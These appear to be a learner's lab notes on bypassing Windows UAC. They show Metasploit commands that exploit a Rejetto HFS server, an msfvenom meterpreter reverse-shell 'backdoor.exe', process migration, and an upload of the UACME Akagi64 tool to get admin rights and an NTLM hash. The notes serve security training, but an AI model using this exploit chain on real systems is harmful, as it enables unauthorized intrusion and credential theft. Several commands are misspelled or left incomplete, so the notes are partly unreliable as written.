#### UAC
	- User Account Control
	- Prevent change to operating system
	- Ensures change to the os is approved by someone of the admin group
	- Non-privileged user will be prompted to give a admin credentials
	- Bypass UAC with exploits as a non-privileged user

#### Bypassing UAC
	- Will need access to user that is part of the admin group
	- Admin privileges will prompt user for confirmation
	- Intergirty level from low to high
	- Tools used depends on the windows target

#### Bypassing UAC with UACMe
	- open source software
	- privilege escalation tool
	- Used for Windows 7 to Windows 10
	- Executes maclicious payloads on windows target using the AuteElevate 
	- The repo has more than 60 exploits

#### Tools

#### Commands

Check net users Windows
```
net users
```

Check users of admin group Windows
```
net localgroup administrators
```

Exploit hfs
```
msfconsole
setg RHOSTS target_ip
search rejetto
use exploit/windows/http/rejetto_hfs_exec
options
exploit
```

Get information on windows machine through meterpreter
```
sysinfo
getuid
```

Change meterpreter windows version 
```
pgrep explorer
migrate 2448
```


Check if user has privileged in meterpreter
```
getprivs
```

Create payload
```
msfvenom -p windows/meterpreter/reverse_tcp  LHOST local_host  LPORT local port -f exe > backdoor.exe
```

Execute and connect payload with mfsoncole
```
mfsconsole 
use windows/meterpreter/reverse_tcp 
set RHOSTS 
set RPORT
```

Upload and bypass UAC
```
Upload 
```

#### Lab

A Kali GUI machine and a target machine running a vulnerable server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.

Then, bypass [UAC](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)using the [UACME](https://github.com/hfiref0x/UACME) tool. 

**UACME:**

- Defeat Windows User Account Control (UAC) and get Administrator privileges.
- It abuses the built-in Windows AutoElevate executables.
- It has 65+ methods that can be used by the user to bypass UAC depending on the Windows OS version.
- Developed by https://twitter.com/hFireF0X
- Written majorly in C, with some code in C++

**Objective:**Gain the highest privilege on the compromised machine and get admin user NTLM hash.

```
nmap -p- -sS -sV -T 4 -v 10.4.26.170


80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown

```

Exploit rejetto with msfconsole 
```
msfconsole
use exploit/windows/http/rejetto_hfs_exec
setg rhosts 10.4.26.170
exploit 
```

Use msfvenom payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT=4000 -f exe > backdoor.exe
```

Upload UACME and backdoor executable to target machine
```
upload /root/backdoor.exe
upload /root/Desktop/tools/UACME/Akagi64.exe
```